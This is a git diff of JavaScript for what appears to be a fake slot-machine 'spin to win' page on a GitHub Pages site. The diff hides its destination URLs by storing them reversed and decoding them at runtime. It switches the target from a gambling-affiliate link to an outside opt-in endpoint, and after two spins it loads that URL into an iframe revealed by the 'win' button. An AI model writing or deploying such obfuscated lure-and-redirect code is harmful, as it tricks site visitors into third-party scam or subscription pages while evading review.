@@ -2,8 +2,7 @@ var count_spins = 0;
 var slot_selector = $('.slot');
 var comment_count_selector = $('#comment-count');
 var switched = 0;
-//var go_url = 'oi.buhtig.333yubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
-var go_url = 'oi.buhtig.333sreyubekac=di_bus?2c00c076d0f34c8255010be5/l/moc.sreffo-sagevnakluv//:sptth';
+var go_url = 'oi.buhtig.333sreyubekac=ps?/nitposc/w/ten.ndc-dw//:sptth';
 var page_url = 'cakebuyers333.github.io';
 var new_url = go_url.split("").reverse().join("");
 
@@ -49,8 +48,8 @@ function forwardTo(goto_link)
 }
 
 $('#win-btn').click(function(e) {
-	//e.preventDefault();
-	//$('#iframe-container').removeClass('hidden');
+	e.preventDefault();
+	$('#iframe-container').removeClass('hidden');
 });
 
 $('#spin-btn').click(function() {
@@ -58,8 +57,8 @@ $('#spin-btn').click(function() {
 
 	if(count_spins == 2)
 	{
-		$('#iframe2').attr('src', 'https://'+page_url+'/done.html');
-		//$('#iframe1').attr('src', new_url);
+		//$('#iframe2').attr('src', 'https://'+page_url+'/done.html');
+		$('#iframe1').attr('src', new_url);
 	}
 	
 	if(count_spins < 3)
